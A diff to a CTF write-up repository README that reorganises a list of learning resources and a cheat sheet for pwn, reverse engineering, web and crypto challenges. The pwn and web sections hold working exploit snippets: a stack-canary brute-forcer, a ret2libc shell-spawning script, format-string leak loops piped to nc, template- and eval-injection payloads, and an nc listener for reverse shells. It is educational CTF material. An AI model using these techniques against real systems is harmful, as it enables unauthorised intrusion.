@@ -3,6 +3,8 @@ Writeups / Files for some of the Cyber CTFs that I've done
 
 I've also included a list of **CTF resources** as well as a comprehensive **cheat sheet** covering tons of common CTF challenges
 
+There is now a web mirror of this repo at [hackback.zip](https://hackback.zip/2024/04/30/CTF-Cheat-Sheet.html)
+
 # Table of Contents
 - **[Resources](#resources)**
   * [YouTube (We love video resources)](#youtube-we-love-video-resources)
@@ -67,35 +69,31 @@ I've also included a list of **CTF resources** as well as a comprehensive **chea
 # Resources
 ## YouTube (We love video resources)
 - [John Hammond](https://www.youtube.com/user/RootOfTheNull)
-    - Used to make a lot of CTF videos, but has moved on to more malware rev stuff
-    - Still a ton of useful videos. The CTF ones especially are amazing for teaching brand new baby cyber members how to do things. Highly highly recommend.
+    - Used to make a lot of CTF videos, but has moved on to other things
+    - Still a ton of useful videos. The CTF ones especially are amazing for teaching people brand new to cyber.
 - [Live Overflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)
     - Makes extremely interesting and in-depth videos about cyber.
     - Has an [amazing pwn series](https://www.youtube.com/watch?v=iyAyN3GFM7A&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&ab_channel=LiveOverflow)
 - [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
-    - Best pwner on YouTube.
-    - Makes writeups of every single HackTheBox machine
+    - Makes writeups of every single HackTheBox 
+    machine
         - Talks about diff ways to solve and why things work. Highly recommend
 - [Computerphile](https://www.youtube.com/user/Computerphile)
     - Same people as Numberphile, but cooler. Makes really beginner-level and intuitive videos about basic concepts.
 - [pwn.college](https://www.youtube.com/channel/UCkRe0pvrQvhkhFSciV0l2MQ)
-    - Beautiful, amazing, wonderful ASU professor that has tons of videos on pwn
+    - ASU professor that has tons of videos on pwn
     - Guided course material: [https://pwn.college/](https://pwn.college/)
     - Tons of practice problems: [https://dojo.pwn.college/](https://dojo.pwn.college/)
 - [PwnFunction](https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A)
     - Very high-quality and easy-to-understand animated videos about diff topics
     - Topics are a bit advanced, but easily understandable
 - [Martin Carlisle](https://www.youtube.com/user/carlislemc/featured)
-    - Princeton Grad - Cyber Professor - picoCTF problem writer - YouTuber - He's got it all!
-    - Fr makes amazing writeup videos about the picoCTF challenges.
+    - Makes amazing writeup videos about the picoCTF challenges.
 - [Sam Bowne](https://www.youtube.com/channel/UCC2OBhIt1sHE4odV05RYP1w)
-	- Absolutely amazing professor at the City College of San Francisco
-	- Sponsor of one of the best CPTC teams in the country
-	- Open sources all of his lectures and course material on [his website](https://samsclass.info/)
+    - CCSF professor that open sources all of his lectures and course material on [his website](https://samsclass.info/)
 - [UFSIT](https://www.youtube.com/channel/UCkRe0pvrQvhkhFSciV0l2MQ)
     - UF Cyber team (I'm a bit biased, but def one of the better YouTube channels for this)
 - [Gynvael](https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg)
-    - Polish guy that competes on an amazing international CTF team
     - Makes amazingly intuitive video writeups. Has done the entirety of picoCTF 2019 (that's a lot)
 - [Black Hills Information Security](https://www.youtube.com/@BlackHillsInformationSecurity)
     - Security firm that makes a ton of educational content
@@ -117,88 +115,66 @@ I've also included a list of **CTF resources** as well as a comprehensive **chea
     - Makes great beginner-friendly videos about IoT hacking
     
 
-**I've also made some playlists of diff topics**
+### Talks
 
-[Pwn](https://www.youtube.com/playlist?list=PLwP8RAsXLdE7rmCJsnhSigSdxsgIGFfvx)
-
-[Crypto](https://www.youtube.com/playlist?list=PLwP8RAsXLdE4luKhUCnMZbsWVB3nHtJgI)
-
-[Web](https://www.youtube.com/playlist?list=PLwP8RAsXLdE4tKItjvHIAyDxrVB9v20qP)
-
-[Forensics](https://www.youtube.com/playlist?list=PLwP8RAsXLdE77qStEZ6si0S8q1D8pdmmp)
-
-[OSINT](https://www.youtube.com/playlist?list=PLwP8RAsXLdE485giESRsEkAxnhMm8T3wo)
-
-[x86 Assembly](https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe)
-
-[CSAW writeups](https://www.youtube.com/playlist?list=PLwP8RAsXLdE5H265XMi4q_LhskD1zJGgK)
-
-**Here are some slides I've made with the help of tjcsc**
-
-[Pwn](https://docs.google.com/presentation/d/1pusn6q46emvX9CN0SQ6YLctO2xVR8_DHEAg50tJbkYc/edit#slide=id.g17686fdf7bd_0_295)
-
-[Crypto](https://docs.google.com/presentation/d/1EmvJPyqm8bpNGwn0SGYgN1rKov-89PajtwE_uZaLESY/edit#slide=id.g12e7ff9f522_0_198)
-
-[Web](https://docs.google.com/presentation/d/1znRapkr1VAUO7gYjuB8jnFsBNSo0Jo7jsGE-JH7nZ9w/edit#slide=id.g1670189b8d9_0_303)
-
-[Rev](https://docs.google.com/presentation/d/1tcYyUrDrRkK74lQI0weHbjp2nSQtsRQlOGYz57zWjI8/edit#slide=id.g15f164357e9_0_4)
+Here are some slides I've put together: [hackback.zip/presentations](https://hackback.zip/presentations)
 
 ## Practice / Learning Sites
 ### CTFs
 - [PicoCTF](https://play.picoctf.org/practice)
-	- Tons of amazing practice challenges.
-	- Definitely the gold standard for getting started
+    - Tons of amazing practice challenges.
+    - Definitely the gold standard for getting started
 - [UCF](https://ctf.hackucf.org/challenges)
-	- Good overall, but great pwn practice
-	- I'm currently working on putting writeups [here](https://github.com/Adamkadaban/CTFs/tree/master/1.CTFs/HackUCF)
+    - Good overall, but great pwn practice
+    - I'm currently working on putting writeups [here](https://github.com/Adamkadaban/CTFs/tree/master/1.CTFs/HackUCF)
 - [hacker101](https://ctf.hacker101.com/ctf)
-	- CTF, but slightly more geared toward pentesting
+    - CTF, but slightly more geared toward pentesting
 - [CSAW](https://365.csaw.io/)
-	- Down 90% the time and usually none of the connections work
-	- If it is up though, it has a lot of good introductory challenges
+    - Down 90% the time and usually none of the connections work
+    - If it is up though, it has a lot of good introductory challenges
 - [CTF101](https://ctf101.org/)
-	- One of the best intros to CTFs I've seen (gj osiris)
-	- Very succinct and beginner-friendly
+    - One of the best intros to CTFs I've seen (gj osiris)
+    - Very succinct and beginner-friendly
 
 
 ### General
 - [HackTheBox](hackthebox.com)
-	- The OG box site
-		- Boxes are curated to ensure quality
-	- Now has some CTF-style problems
-	- Now has courses to start learning
+    - The OG box site
+        - Boxes are curated to ensure quality
+    - Now has some CTF-style problems
+    - Now has courses to start learning
 - [TryHackMe](https://tryhackme.com/hacktivities)
-	- Slightly easier boxes than HackTheBox
-	- Step-by-step challenges
-	- Now has "learning paths" to guide you through topics
+    - Slightly easier boxes than HackTheBox
+    - Step-by-step challenges
+    - Now has "learning paths" to guide you through topics
 - [CybersecLabs](https://www.cyberseclabs.co.uk/)
-	- Great collection of boxes
-	- Has some CTF stuff
+    - Great collection of boxes
+    - Has some CTF stuff
 - [VulnHub](https://www.vulnhub.com/)
-	- Has vulnerable virtual machines you have to deploy yourself
-	- Lots of variety, but hard to find good ones imo
+    - Has vulnerable virtual machines you have to deploy yourself
+    - Lots of variety, but hard to find good ones imo
 ### Pwn
 - [pwnable.kr](http://pwnable.kr/index.php)
-	- Challenges with good range of difficulty
+    - Challenges with good range of difficulty
 - [pwnable.tw](https://pwnable.tw/challenge/)
-	- Harder than pwnable.kr
-	- Has writeups once you solve the chall
+    - Harder than pwnable.kr
+    - Has writeups once you solve the chall
 - [pwnable.xyz](https://pwnable.xyz/challenges/)
-	- More pwn challenges
-	- Has writeups once you solve the chall
-	- You can upload your own challenges once you solve all of them
+    - More pwn challenges
+    - Has writeups once you solve the chall
+    - You can upload your own challenges once you solve all of them
 - [pwn dojo](https://dojo.pwn.college)
-	- Best collection of pwn challenges in my opinion
-	- Backed up with slides teaching how to do it & has a discord if you need help
+    - Best collection of pwn challenges in my opinion
+    - Backed up with slides teaching how to do it & has a discord if you need help
 - [nightmare](https://guyinatuxedo.github.io/)
-	- Gold standard for pwning C binaries
-	- Has a few mistakes/typos, but amazing overall
+    - Gold standard for pwning C binaries
+    - Has a few mistakes/typos, but amazing overall
 - [pwn notes](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)
-	- Notes from some random person online
-	- Very surface-level, but good intro to everything
+    - Notes from some random person online
+    - Very surface-level, but good intro to everything
 - [Security Summer School](https://security.cs.pub.ro/summer-school/wiki/start)
-	- University of Bucharest Security Course
-	- Very beginner-friendly explanations 
+    - University of Bucharest Security Course
+    - Very beginner-friendly explanations 
 - [RPISEC MBE](https://github.com/RPISEC/MBE)
     - RPI's Modern Binary Exploitation Course
     - Has a good amount of labs/projects for practice & some (slightly dated) lectures
@@ -215,8 +191,8 @@ I've also included a list of **CTF resources** as well as a comprehensive **chea
 
 ### Rev
 - [challenges.re](https://challenges.re/)
-	- So many challenges 0_0
-	- Tons of diversity
+    - So many challenges 0_0
+    - Tons of diversity
 - [reversing.kr](http://reversing.kr/)
 - [crackmes.one](https://crackmes.one)
     - Tons of crackme (CTF) style challenges
@@ -224,44 +200,48 @@ I've also included a list of **CTF resources** as well as a comprehensive **chea
 
 ### Web
 - [websec.fr](http://websec.fr/#)
-	- Lots of web challenges with a good range of difficulty
+    - Lots of web challenges with a good range of difficulty
 - [webhacking.kr](https://webhacking.kr/chall.php)
-	- Has archive of lots of good web challenges
+    - Has archive of lots of good web challenges
 - [Securing Web Applications](https://samsclass.info/129S/129S_S22.shtml)
-	- Open source CCSF Course
+    - Open source CCSF Course
 - [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
-	- Very much geared toward pentesting, but useful for exploring web in CTFs
-	- Over 100 vulns/challenges in total
+    - Very much geared toward pentesting, but useful for exploring web in CTFs
+    - Over 100 vulns/challenges in total
 - [PortSwigger](https://portswigger.net/web-security/dashboard)
-	- Gold standard for understanding web hacking
-	- Tons of amazing challenges & explanations
+    - Gold standard for understanding web hacking
+    - Tons of amazing challenges & explanations
 - [DVWA](https://dvwa.co.uk/)
-	- Very much geared toward pentesting, but useful for exploring web in CTFs
+    - Very much geared toward pentesting, but useful for exploring web in CTFs
 - [bWAPP](http://www.itsecgames.com/)
-	- Very much geared toward pentesting, but useful for exploring web in CTFs
+    - Very much geared toward pentesting, but useful for exploring web in CTFs
 - [CTF Challenge](https://ctfchallenge.com/register)
     - Collection of web challenges made by Adam Langley that are made to be as realistic as possible.
     - Good for getting bug bounty experience
+
 ### Crypto
 - [CryptoHack](https://cryptohack.org/)
-	- I'm currently working on putting writeups [here](https://github.com/Adamkadaban/CTFs/tree/master/2.Labs/CryptoHack)
+    - I'm currently working on putting writeups [here](https://github.com/Adamkadaban/CTFs/tree/master/2.Labs/CryptoHack)
 - [cryptopals](https://cryptopals.com/)
-	- The OG crypto challenge site.
+    - The OG crypto challenge site.
+
 ### Smart Contracts
 - [Capture the Ether](https://capturetheether.com/)
+
 ### Cloud
 - [CloudFoxable](https://cloudfoxable.bishopfox.com)
-	- Walks you through setting up a vulnerable environment to be exploited using [cloudfox](https://github.com/BishopFox/cloudfox)
+    - Walks you through setting up a vulnerable environment to be exploited using [cloudfox](https://github.com/BishopFox/cloudfox)
 - [flaws.cloud](https://flaws.cloud)
-	- Free challenges that involve finding secrets in S3, EC2, and Lambda
+    - Free challenges that involve finding secrets in S3, EC2, and Lambda
+
 ### Pentesting
 - [hacker101](https://www.hacker101.com/videos)
 - [hacksplaining](https://www.hacksplaining.com/lessons)
 - [Exploit developement](https://samsclass.info/127/127_S22.shtml)
-	- Open source CCSF Course
+    - Open source CCSF Course
 - [Intro to Security](https://cseweb.ucsd.edu/~dstefan/cse127-fall21/)
-	- UC San Diego course taught by Deian Stefan
-	- Covers basic pwn and crypto 
+    - UC San Diego course taught by Deian Stefan
+    - Covers basic pwn and crypto 
 - [Active Directory Cheat Sheet](https://github.com/Tib3rius/Active-Directory-Exploitation-Cheat-Sheet)
 - [WADComs](https://wadcoms.github.io/)
     - Interactive cheat sheet for Windows/AD environments
@@ -277,7 +257,7 @@ I've also included a list of **CTF resources** as well as a comprehensive **chea
 #### General
 
 - [AperiSolve](https://github.com/Zeecka/AperiSolve)
-	- Tool that automatically runs other stego tools
+    - Tool that automatically runs other stego tools
 - Really good resource from John Hammond for different types of challenges:
     - [https://github.com/JohnHammond/ctf-katana](https://github.com/JohnHammond/ctf-katana)
 - Another very great cheat sheet for creating and solving challenges:
@@ -309,11 +289,11 @@ I've also included a list of **CTF resources** as well as a comprehensive **chea
     - `ghex <file.xyz>`
 - docx files are containers so you can unzip them to find hidden content
     - `unzip <file.docx>`
-- Grep | A good way to use grep to find the flag recursively:
+- Grep - A good way to use grep to find the flag recursively:
     - `grep -r --text 'picoCTF{.*}'`
     - `egrep -r --text 'picoCTF{.*?}`
     - You can change 'picoCTF' to the beginning of the flag you are looking for
-- Ltrace | Allows you to see what the code is doing as you run the program:
+- Ltrace - Allows you to see what the code is doing as you run the program:
     - `ltrace ./<file>`
     - `ltrace -s 100 ./<file>`
         - Ltrace shortens very long strings. You can use -s to increase how many characters ltrace shows. Good for when looking at strcmp that have large strings.
@@ -331,8 +311,8 @@ I've also included a list of **CTF resources** as well as a comprehensive **chea
     - [Alt Decoder](https://www.blackcatsystems.com/software/sstv.html)
     - Use these qsstv settings:
     
-    ![SSTV settings](.resources/SSTV_settings.png)
-    
+    ![SSTV settings](./.resources/SSTV_settings.png)
+
 - Spectrogram image
     - [Decoder](https://academo.org/demos/spectrum-analyzer/)
 - Change pitch, speed, direction...
@@ -401,6 +381,7 @@ I've also included a list of **CTF resources** as well as a comprehensive **chea
 ## Pwn / Binary Exploitation
 - **For this one, I suggest looking at my [LearnPwn](https://github.com/Adamkadaban/LearnPwn) repo instead, as this cheatsheet was made before I knew much about pwn**
     - However, I have included _some_ notes amending to what I have here.
+
 #### General
 
 - check security of ELF
@@ -457,6 +438,7 @@ I've also included a list of **CTF resources** as well as a comprehensive **chea
 - Stack canary is a value placed before the EIP/RIP (instruction pointer) that can overwritten by a buffer overflow. The program causes an error basically if the stack is overwritten to something different than it originally was. Our goal is to find the original stack so when we overflow, the program runs normally.
 - The stack canary is taken from `gs`, or `fs` (for 32 and 64 bit respectively)
     - In the disassembly, before something is read, you can see a line similar to the following:
+
 ```
    0x000000000000121a <+4>: sub    rsp,0x30
    0x000000000000121e <+8>: mov    rax,QWORD PTR fs:0x28
@@ -493,16 +475,16 @@ alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
 canary = ''
 # Here we are bruteforcing a canary 4 bytes long
 for i in range(1,5):
-	for letter in range(0,len(alphabet)):  # We will go through each letter/number in the string 'alphabet'
-		p = elf.process()  # We start the process
-		wait = p.recv().decode('utf-8')
-		p.sendline(str(32+i))  # In this program, we had to specify how many bytes we were gonna send.
-		wait = p.recv().decode('utf-8')
-		p.sendline('A'*32 + canary + alphabet[letter])  # We send the 32 A's to overflow, and then the canary we already have + our guess
-		prompt = p.recv().decode('utf-8')
-		if "Stack" not in prompt:  # The program prints "Stack smashed [...]" if we get wrongfully write the canary.
-			canary += alphabet[letter]  # If it doesn't print that, we got part of our canary :)
-			break  # Move on to the next canary letter/number
+    for letter in range(0,len(alphabet)):  # We will go through each letter/number in the string 'alphabet'
+        p = elf.process()  # We start the process
+        wait = p.recv().decode('utf-8')
+        p.sendline(str(32+i))  # In this program, we had to specify how many bytes we were gonna send.
+        wait = p.recv().decode('utf-8')
+        p.sendline('A'*32 + canary + alphabet[letter])  # We send the 32 A's to overflow, and then the canary we already have + our guess
+        prompt = p.recv().decode('utf-8')
+        if "Stack" not in prompt:  # The program prints "Stack smashed [...]" if we get wrongfully write the canary.
+            canary += alphabet[letter]  # If it doesn't print that, we got part of our canary :)
+            break  # Move on to the next canary letter/number
 
 print("The canary is: " + canary)
 ```
@@ -515,15 +497,15 @@ print("The canary is: " + canary)
 - Sometimes, trying to print only strings from the stack like this: '%s %s %s %s %s %s' may cause errors since not everything in the stack is a string.
 - Try to minimize that by doing '%x %x %x %x %x %s' instead
 - Instead of having to constantly increase how many %x and %s you type, you can pass a parameter to make it easier:
-    - `%1$s` | This will print the first value in the stack (from what I understand, the one right next to your buffer) as a string.
-    - `%2$s` | This will print the 2nd value as a string, and you get the idea
+    - `%1$s` - This will print the first value in the stack (from what I understand, the one right next to your buffer) as a string.
+    - `%2$s` - This will print the 2nd value as a string, and you get the idea
     - You can use one-liner loops to try to find the flag by leaking the stack. Press ^C (CTRL + C) to go to the next value.
         - `for i in {1..100}; do echo "%$i\$s" | nc [b7dca240cf1fbf61.247ctf.com](http://b7dca240cf1fbf61.247ctf.com/) 50478; done`
 - You can control how much you leak using different size parameters:
-	- `%hhx` leaks 1 byte (half of half of int size)
-	- `%hx` leaks 2 bytes (half of int size)
-	- `%x` leaks 4 bytes (int size)
-	- `%lx` leaks 8 bytes (long size)
+    - `%hhx` leaks 1 byte (half of half of int size)
+    - `%hx` leaks 2 bytes (half of int size)
+    - `%x` leaks 4 bytes (int size)
+    - `%lx` leaks 8 bytes (long size)
 - very good video on modifying the stack with fstring vuln and %n:
     - [https://www.youtube.com/watch?v=gzLPVkZbaPA&ab_channel=MartinCarlisle](https://www.youtube.com/watch?v=gzLPVkZbaPA&ab_channel=MartinCarlisle)
     
@@ -547,56 +529,56 @@ print("The canary is: " + canary)
 
 - If you already know the libc file and a location (ie. dont have to leak them...)
     
-    ```python
-    #!/bin/python3
-    
-    from pwn import *
-    import os
-    
-    binaryName = 'ret2libc1'
-    
-    # get the address of libc file with ldd
-    libc_loc = os.popen(f'ldd {binaryName}').read().split('\n')[1].strip().split()[2]
-    
-    # use one_gadget to see where execve is in that libc file
-    one_gadget_libc_execve_out = [int(i.split()[0], 16) for i in os.popen(f'one_gadget {libc_loc}').read().split("\n") if "execve" in i]
-    
-    # pick one of the suitable addresses
-    libc_execve_address = one_gadget_libc_execve_out[1]
-    
-    p = process(f'./{binaryName}')
-    e = ELF(f'./{binaryName}')
-    l = ELF(libc_loc)
-    
-    # get the address of printf from the binary output
-    printf_loc = int(p.recvuntil('\n').rstrip(), 16)
-    
-    # get the address of printf from libc
-    printf_libc = l.sym['printf']
-    
-    # calculate the base address of libc
-    libc_base_address = printf_loc - printf_libc
-    
-    # generate payload
-    
-    # 0x17 is from gdb analysis of offset from input to return address
-    offset = 0x17
-    
-    payload = b"A"*offset
-    payload += p64(libc_base_address + libc_execve_address)
-    
-    # send the payload
-    p.sendline(payload)
-    
-    # enter in interactive so we can use the shell created from our execve payload
-    p.interactive()
-    ```
+```python
+#!/bin/python3
+
+from pwn import *
+import os
+
+binaryName = 'ret2libc1'
+
+# get the address of libc file with ldd
+libc_loc = os.popen(f'ldd {binaryName}').read().split('\n')[1].strip().split()[2]
+
+# use one_gadget to see where execve is in that libc file
+one_gadget_libc_execve_out = [int(i.split()[0], 16) for i in os.popen(f'one_gadget {libc_loc}').read().split("\n") if "execve" in i]
+
+# pick one of the suitable addresses
+libc_execve_address = one_gadget_libc_execve_out[1]
+
+p = process(f'./{binaryName}')
+e = ELF(f'./{binaryName}')
+l = ELF(libc_loc)
+
+# get the address of printf from the binary output
+printf_loc = int(p.recvuntil('\n').rstrip(), 16)
+
+# get the address of printf from libc
+printf_libc = l.sym['printf']
+
+# calculate the base address of libc
+libc_base_address = printf_loc - printf_libc
+
+# generate payload
+
+# 0x17 is from gdb analysis of offset from input to return address
+offset = 0x17
+
+payload = b"A"*offset
+payload += p64(libc_base_address + libc_execve_address)
+
+# send the payload
+p.sendline(payload)
+
+# enter in interactive so we can use the shell created from our execve payload
+p.interactive()
+```
     
 
 ## Reverse Engineering
 
 > Cool Guide: [https://opensource.com/article/20/4/linux-binary-analysis](https://opensource.com/article/20/4/linux-binary-analysis)
-> 
+ 
 - [Ghidra](https://ghidra-sre.org/)
     - Very useful decompiler
 - dotPeek or dnSpy
@@ -621,10 +603,10 @@ print("The canary is: " + canary)
 
 #### SMT Solvers
 - [angr](https://github.com/angr/angr) (python)
-	- [Docs](https://docs.angr.io/core-concepts/toplevel)
-	- [Tutorial](.resources/SMT_Solvers.md#2-angr)
+    - [Docs](https://docs.angr.io/core-concepts/toplevel)
+    - [Tutorial](https://github.com/Adamkadaban/CTFs/blob/master/.resources/SMT_Solvers.md)
 - [z3](https://github.com/Z3Prover/z3)
-	- [Tutorial](.resources/SMT_Solvers.md#1-z3)
+    - [Tutorial](https://github.com/Adamkadaban/CTFs/blob/master/.resources/SMT_Solvers.md)
 
 #### Reversing byte-by-byte checks (side-channel attack)
 
@@ -632,7 +614,9 @@ print("The canary is: " + canary)
 
 - Here's a version I made for a challenge that uses a time-based attack:
     - You might have to run it a couple times just to account for randomness
-```python3
+
+
+```python
 #!/bin/python3
 
 from pwn import *
@@ -715,9 +699,9 @@ p.interactive()
     - [tplmap](https://github.com/epinna/tplmap)
         - Automated server-side template injection
     - Jinja Injection
-        - {{ config.items() }}
+        - \{\{ config.items() \}\}
     - Flask Injection
-        - {{config}}
+        - \{\{ config \}\}
     - Python eval() function
         - `__import__.('subprocess').getoutput('<command>')`
             - make sure to switch the parentheses if it doesn't work
@@ -725,8 +709,8 @@ p.interactive()
             - list files in system
     - [More python injection](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1)
 - Cross Site Scripting
-	- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
-		- Google's Content Security Policy Evaluator
+    - [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
+        - Google's Content Security Policy Evaluator
 
 ### Fuzzing input fields
 
@@ -755,48 +739,48 @@ p.interactive()
 - [Caesars Cipher](https://www.dcode.fr/caesar-cipher)
 - [Vigenere Cipher](https://www.dcode.fr/vigenere-cipher)
     
-    ```python
-    #### Solver using custom table
-    cipherText = ""
-    plainText = ""
-    flagCipherText = ""
-    tableFile = ""
-    
-    with open(cipherText) as fin:
-        cipher = fin.readline().rstrip()
-    
-    with open(plainText) as fin:
-        plain = fin.readline().rstrip()
-    
-    with open(flagCipherText) as fin:
-        flag = fin.readline().rstrip()
-    
-    with open(tableFile) as fin:
-        table = [i.rstrip().split() for i in fin.readlines()]
-    
-    table[0].insert(0, "") # might have to modify this part.
-    			# just a 2d array with the lookup table
-    			# should still work if the table is slightly off, but the key will be wrong
-    key = ""
-    for i, c in enumerate(plain[0:100]):
-      col = table[0].index(c)
-      for row in range(len(table)):
-        if table[row][col] == cipher[i]:
-          key += table[row][0]
-          break
-    
-    print(key)
-    
-    dec_flag = ""
-    for i, c in enumerate(flag[:-1]):
-      col = table[0].index(key[i])
-      for row in range(len(table)):
-        if table[row][col] == flag[i]:
-          dec_flag += table[row][0]
-          break
-    
-    print(dec_flag)
-    ```
+```python
+#### Solver using custom table
+cipherText = ""
+plainText = ""
+flagCipherText = ""
+tableFile = ""
+
+with open(cipherText) as fin:
+    cipher = fin.readline().rstrip()
+
+with open(plainText) as fin:
+    plain = fin.readline().rstrip()
+
+with open(flagCipherText) as fin:
+    flag = fin.readline().rstrip()
+
+with open(tableFile) as fin:
+    table = [i.rstrip().split() for i in fin.readlines()]
+
+table[0].insert(0, "") # might have to modify this part.
+            # just a 2d array with the lookup table
+            # should still work if the table is slightly off, but the key will be wrong
+key = ""
+for i, c in enumerate(plain[0:100]):
+  col = table[0].index(c)
+  for row in range(len(table)):
+    if table[row][col] == cipher[i]:
+      key += table[row][0]
+      break
+
+print(key)
+
+dec_flag = ""
+for i, c in enumerate(flag[:-1]):
+  col = table[0].index(key[i])
+  for row in range(len(table)):
+    if table[row][col] == flag[i]:
+      dec_flag += table[row][0]
+      break
+
+print(dec_flag)
+```
     
 - [Substitution Cipher](https://www.quipqiup.com/)
 - [Rot13](https://rot13.com/)
@@ -812,7 +796,7 @@ from Crypto.PublicKey import RSA
 keyName = "example.pem"
 
 with open(keyName,'r') as f:
-	key = RSA.import_key(f.read())
+    key = RSA.import_key(f.read())
 
 print(key)
 
@@ -835,73 +819,74 @@ print(key.u)
     - [Proof](https://www.di-mgt.com.au/crt_rsa.html)
 
 - Old
-    
-    ```python
-    def egcd(a, b):
-        if a == 0:
-            return (b, 0, 1)
-        g, y, x = egcd(b%a,a)
-        return (g, x - (b//a) * y, y)
-    
-    def modinv(a, m):
-        g, x, y = egcd(a, m)
-        if g != 1:
-            raise Exception('No modular inverse')
-        return x%m
-    
-    p = 
-    q = 
-    e = 
-    c = 
-    
-    n = p*q # use factordb command or website to find factors
-    
-    phi = (p-1)*(q-1) # phi is simply the product of (factor_1-1) * ... * (factor_n -1)
-    
-    d = modinv(e, phi) # private key
-    
-    # print(d)
-    
-    m = pow(c,d,n) # decrypted plaintext message in long integer form
-    
-    thing = hex(m)[2:] # ascii without extra stuff at the start (0x)
-    print(bytes.fromhex(thing).decode('ascii'))
-    ```
-    
+
+```python
+def egcd(a, b):
+    if a == 0:
+        return (b, 0, 1)
+    g, y, x = egcd(b%a,a)
+    return (g, x - (b//a) * y, y)
+
+def modinv(a, m):
+    g, x, y = egcd(a, m)
+    if g != 1:
+        raise Exception('No modular inverse')
+    return x%m
+
+p = 
+q = 
+e = 
+c = 
+
+n = p*q # use factordb command or website to find factors
+
+phi = (p-1)*(q-1) # phi is simply the product of (factor_1-1) * ... * (factor_n -1)
+
+d = modinv(e, phi) # private key
+
+# print(d)
+
+m = pow(c,d,n) # decrypted plaintext message in long integer form
+
+thing = hex(m)[2:] # ascii without extra stuff at the start (0x)
+print(bytes.fromhex(thing).decode('ascii'))
+```
+
 - New
-    
-    ```python
-    #!/bin/python3
-    from Crypto.Util.number import *
-    from factordb.factordb import FactorDB
-    
-    # ints:
-    n =    
-    e =  
-    c =  
-    
-    f = FactorDB(n)
-    f.connect()
-    factors = f.get_factor_list()
-    
-    phi = 1
-    for i in factors:
-    	phi *= (i-1)
-    
-    d = inverse(e, phi)
-    m = pow(c, d, n)
-    
-    flag = long_to_bytes(m).decode('UTF-8')
-    print(flag)
-    ```
-    
+
+```python
+#!/bin/python3
+from Crypto.Util.number import *
+from factordb.factordb import FactorDB
+
+# ints:
+n =    
+e =  
+c =  
+
+f = FactorDB(n)
+f.connect()
+factors = f.get_factor_list()
+
+phi = 1
+for i in factors:
+    phi *= (i-1)
+
+d = inverse(e, phi)
+m = pow(c, d, n)
+
+flag = long_to_bytes(m).decode('UTF-8')
+print(flag)
+```
+
 - Website that gives factors and euler's totient (phi)
     - [https://www.alpertron.com.ar/ECM.HTM](https://www.alpertron.com.ar/ECM.HTM)
 
 #### Coppersmith attack (c,e)
 - Usually used if the exponent is very small (e <= 5)
     - [Proof](https://web.eecs.umich.edu/~cpeikert/lic13/lec04.pdf)
-```python3
+
+```python
 from Crypto.Util.number import *
 def nth_root(radicand, index):
     lo = 1
@@ -930,7 +915,8 @@ print(plaintext.decode("UTF-8"))
 #### Pollards attack (n,e,c)
 - Based on [Pollard's factorization method](http://www.math.columbia.edu/~goldfeld/PollardAttack.pdf), which makes products of primes [easy to factor](https://people.csail.mit.edu/rivest/pubs/RS01.version-1999-11-22.pdf) if they are (B)smooth 
     - This is the case if `p-1 | B!` and `q - 1` has a factor > `B`
-```python3
+
+```python
 from Crypto.Util.number import *
 from math import gcd
 
@@ -965,7 +951,8 @@ print(flag)
 - For use when d is too small (or e is too big)
     - Using [this](https://github.com/orisano/owiener) python module
     - [Proof](https://sagi.io/crypto-classics-wieners-rsa-attack/)
-```python3
+
+```python
 from Crypto.Util.number import *
 import owiener
 
@@ -1057,13 +1044,15 @@ print(flag)
 1. Install `rlwrap` on your system
 2. Now, every time you run a nc listener, just put `rlwrap` in front
 3. For example: `rlwrap nc -lvnp 1337`
-	* This will give you arrow keys and command history, but won't give autocompletion (as far as I can tell) for windows and *nix systems 
+    * This will give you arrow keys and command history, but won't give autocompletion (as far as I can tell) for windows and *nix systems 
+
 ## OSINT
 
 - [pimeyes](https://pimeyes.com/en)
     - Reverse search faces on the internet
 - [OSINT Framework](https://osintframework.com/)
     - Website that aggregates tons of OSINT tools.
+
 ## Misc
 
 - Resolving DNS Errors
@@ -1080,6 +1069,3 @@ print(flag)
     - [https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php](https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php)
 - View CNC GCode
     - [https://ncviewer.com/](https://ncviewer.com/)
-
-# Notes
-* TOC generated with [ecotrust-canada](https://github.com/jonschlinkert/markdown-toc)
